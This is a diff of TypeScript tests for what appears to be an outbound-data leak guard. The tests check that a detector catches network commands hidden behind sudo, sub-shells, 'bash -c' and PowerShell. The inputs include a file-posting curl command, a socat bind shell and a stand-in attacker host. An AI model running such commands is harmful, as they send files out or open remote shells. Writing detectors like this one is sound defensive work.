@@ -406,3 +406,58 @@ test("marker decision: onRefuse overrides the mode preset in both directions", (
   assert.deepEqual(blk.confirm, []);
   assert.equal(blk.blocked.length, 1);
 });
+
+// ── marker dimension: keyless scope (unified Anywhere) ──────────────────
+
+test("marker decision: scope without destinations key — mode governs blind sends, sends pass", () => {
+  const scope: EffectiveScope = { destinations: undefined, tools: undefined, envNames: undefined, mode: "semi-strict", onRefuse: "block" };
+  const scopes = new Map([["r", scope]]);
+  // Blind send (signature, no destination): the two-step leak path stays closed.
+  const blind = decideMarkedPaths(new Set(["r"]), {
+    scopes, ruleName: (id) => id, destinations: [], signatureOnly: true,
+  });
+  assert.deepEqual(blind.blocked.map((v) => v.ruleId), ["r"]);
+  assert.deepEqual(blind.unverified, []);
+  // Destination extracted, no allowlist: nothing to violate.
+  const send = decideMarkedPaths(new Set(["r"]), {
+    scopes, ruleName: (id) => id, destinations: ["evil.test.internal"], signatureOnly: false,
+  });
+  assert.deepEqual(send.blocked, []);
+  assert.deepEqual(send.confirm, []);
+  assert.deepEqual(send.unverified, []);
+});
+
+// ── signature hardening: wrappers, sub-shells, single &, Windows ────────
+
+test("hasNetworkSignature: wrapper prefixes are transparent", () => {
+  assert.equal(hasNetworkSignature("sudo curl https://x"), true);
+  assert.equal(hasNetworkSignature("nohup wget -q https://x &"), true);
+  assert.equal(hasNetworkSignature("timeout 10 curl https://x"), true);
+  assert.equal(hasNetworkSignature("env FOO=1 curl https://x"), true);
+  assert.equal(hasNetworkSignature("nice -n 5 curl https://x"), true);
+  assert.equal(hasNetworkSignature("xargs curl"), true);
+  assert.equal(hasNetworkSignature("sudo -u alice curl https://x"), false, "sudo's own args stay opaque");
+});
+
+test("hasNetworkSignature: sub-shells and single & segments", () => {
+  assert.equal(hasNetworkSignature("echo done & curl -d @f https://x"), true);
+  assert.equal(hasNetworkSignature("echo $(curl https://x)"), true);
+  assert.equal(hasNetworkSignature("echo `wget -q https://x`"), true);
+  assert.equal(hasNetworkSignature("diff <(curl https://x) f"), true);
+  assert.equal(hasNetworkSignature("bash -c 'curl https://x'"), true);
+  assert.equal(hasNetworkSignature("sh -c \"wget https://x\""), true);
+  assert.equal(hasNetworkSignature("powershell -Command \"iwr https://x\""), true);
+});
+
+test("hasNetworkSignature: Windows forms and new table entries", () => {
+  assert.equal(hasNetworkSignature("Invoke-WebRequest -Uri https://x"), true);
+  assert.equal(hasNetworkSignature("iwr https://x"), true);
+  assert.equal(hasNetworkSignature("irm https://x"), true);
+  assert.equal(hasNetworkSignature("C:\\Windows\\System32\\curl.exe https://x"), true);
+  assert.equal(hasNetworkSignature("CURL https://x"), true);
+  assert.equal(hasNetworkSignature("socat TCP-LISTEN:8080 EXEC:sh"), true);
+  assert.equal(hasNetworkSignature("echo | openssl s_client -connect x:443"), true);
+  assert.equal(hasNetworkSignature("openssl enc -aes-256-cbc -in f -out f.enc"), false, "local openssl crypto is not outbound");
+  assert.equal(hasNetworkSignature("powershell -Command Get-Process"), false);
+  assert.equal(consumerSignatureWord("powershell -File x.ps1"), "powershell");
+});
